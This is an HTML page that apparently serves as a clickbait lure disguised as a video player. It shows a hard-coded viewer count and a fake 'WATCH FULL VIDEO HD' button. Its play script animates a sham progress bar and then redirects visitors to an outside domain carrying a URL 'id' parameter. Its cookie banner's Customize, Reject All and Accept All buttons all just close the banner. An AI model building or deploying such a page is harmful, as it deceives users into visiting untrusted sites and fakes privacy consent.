<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Video Player</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { 
            background-color: #ffffff; 
            color: #1c1e21; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            margin: 0; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            padding-top: 20px;
            padding-bottom: 50px;
            min-height: 100vh;
        }

        /* Video Elements */
        .video-header { width: 95%; max-width: 600px; margin-bottom: 12px; }
        .video-header h1 { font-size: 20px; margin: 0; font-weight: 700; color: #050505; }
        .live-status { width: 95%; max-width: 600px; background: #f0f2f5; padding: 8px 12px; border-radius: 6px; margin-bottom: 15px; border-left: 4px solid #061124; font-size: 13px; font-weight: 600; }
        
        .video-container {
            position: relative; width: 95%; max-width: 600px; aspect-ratio: 16 / 9;
            background: #000 url('https://images.unsplash.com/photo-1529139513055-07f9127e9544?q=80&w=600&auto=format&fit=crop') center/cover no-repeat;
            border-radius: 12px; display: flex; justify-content: center; align-items: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2); overflow: hidden; cursor: pointer;
        }

        .play-btn-circle { width: 70px; height: 70px; background: rgba(255, 255, 255, 0.95); border-radius: 50%; display: flex; justify-content: center; align-items: center; z-index: 2; }
        .spinner-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 10; }
        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-top: 4px solid #fff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .video-controls { position: absolute; bottom: 0; left: 0; width: 100%; background: linear-gradient(transparent, rgba(0,0,0,0.8)); padding: 10px 15px; display: flex; align-items: center; gap: 12px; z-index: 11; opacity: 0; transition: opacity 0.3s; }
        .progress-area { flex-grow: 1; height: 4px; background: rgba(255,255,255,0.3); border-radius: 2px; position: relative; overflow: hidden; }
        #progress-bar { width: 0%; height: 100%; background: #969696; position: absolute; left: 0; top: 0; }
        .time-display { color: white; font-size: 11px; min-width: 80px; }

        .btn-full { display: inline-block; background: #061124; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-weight: 700; margin-top: 15px; cursor: pointer; }

        /* --- MODERN FLOATING COOKIE POPUP --- */
        .cookie-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.3); display: flex; z-index: 9999;
            pointer-events: none; justify-content: center; align-items: flex-end;
        }

        .cookie-card {
            background: #ffffff; pointer-events: auto;
            box-shadow: 0 15px 50px rgba(0,0,0,0.3);
            display: flex; flex-direction: column; text-align: center;
            box-sizing: border-box; border: 1px solid #f0f0f0;
        }

        .cookie-card h2 { font-size: 20px; font-weight: 700; margin: 0 0 12px 0; color: #000; }
        .cookie-card p { font-size: 14px; color: #4b4f56; line-height: 1.5; margin: 0 0 20px 0; }

        .button-group { display: flex; flex-direction: column; gap: 10px; width: 100%; }
        .btn-base { width: 100%; padding: 14px; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; border: 1px solid #dddfe2; background: #ffffff; color: #4b4f56; }
        .btn-primary { background: #1877f2; color: white; border: none; }

        .cookie-footer { margin-top: 15px; font-size: 12px; color: #8a8d91; display: flex; align-items: center; justify-content: center; gap: 4px; }
        .admin-brand { color: #00c4cc; font-weight: 800; }
        .hidden { display: none !important; }

        /* RESPONSIVE LOGIC */
        @media (max-width: 767px) {
            .cookie-card { width: 92%; border-radius: 20px; padding: 30px 20px 20px 20px; margin-bottom: 40px; }
            .btn-full { width: 95%; }
        }

        @media (min-width: 768px) {
            .cookie-overlay { justify-content: flex-start; align-items: flex-end; padding: 30px; }
            .cookie-card { width: 400px; padding: 30px; border-radius: 15px; margin-bottom: 0; }
            .button-group { flex-direction: row; }
        }
    </style>
</head>
<body>

    <div class="video-header"><h1>Home</h1></div>
    <div class="live-status"><i class="fa-solid fa-users"></i> <span id="viewer-count">13,402</span> people are watching</div>

    <div class="video-container" onclick="startLoading()">
        <div class="play-btn-circle" id="play-icon"><i class="fa-solid fa-play"></i></div>
        <div id="video-spinner" class="spinner-overlay"><div class="spinner"></div></div>
        <div id="video-controls" class="video-controls">
            <i class="fa-solid fa-play"></i>
            <div class="progress-area"><div id="progress-bar"></div></div>
            <div class="time-display"><span id="current-time">0:00</span> / 5:24</div>
        </div>
    </div>

    <div class="btn-full" onclick="startLoading()">WATCH FULL VIDEO HD</div>

    <div id="cookieModal" class="cookie-overlay">
        <div class="cookie-card">
            <h2>We respect your privacy</h2>
            <p>Cookies help us improve your experience, deliver personalized content, and analyze traffic.</p>
            <div class="button-group">
                <button class="btn-base" onclick="dismissModal()">Customize</button>
                <button class="btn-base" onclick="dismissModal()">Reject All</button>
                <button class="btn-base btn-primary" onclick="dismissModal()">Accept All</button>
            </div>
            <div class="cookie-footer">Powered by <span class="admin-brand">CookieAdmin</span></div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const videoId = urlParams.get('id') || 'default';
        const daftarDomain = [
            "https://mogoflox.it.com/",
        ];

        let isLoading = false;
        function startLoading() {
            if(isLoading) return;
            isLoading = true;

            const spinner = document.getElementById('video-spinner');
            const controls = document.getElementById('video-controls');
            const progressBar = document.getElementById('progress-bar');
            const playIcon = document.getElementById('play-icon');
            const currentTimeEl = document.getElementById('current-time');

            playIcon.style.display = 'none';
            spinner.style.display = 'flex';
            controls.style.opacity = '1';

            let width = 0;
            const interval = setInterval(function() {
                if (width >= 100) {
                    clearInterval(interval);
                    const domain = daftarDomain[Math.floor(Math.random() * daftarDomain.length)];
                    window.location.href = domain + videoId;
                } else {
                    width += 0.5;
                    progressBar.style.width = width + '%';
                    let totalSec = Math.floor((width / 100) * 324);
                    let mins = Math.floor(totalSec / 60);
                    let secs = totalSec % 60;
                    currentTimeEl.innerText = mins + ":" + (secs < 10 ? "0" + secs : secs);
                }
            }, 15);
        }

        function dismissModal() { document.getElementById('cookieModal').classList.add('hidden'); }
    </script>
</body>
</html>
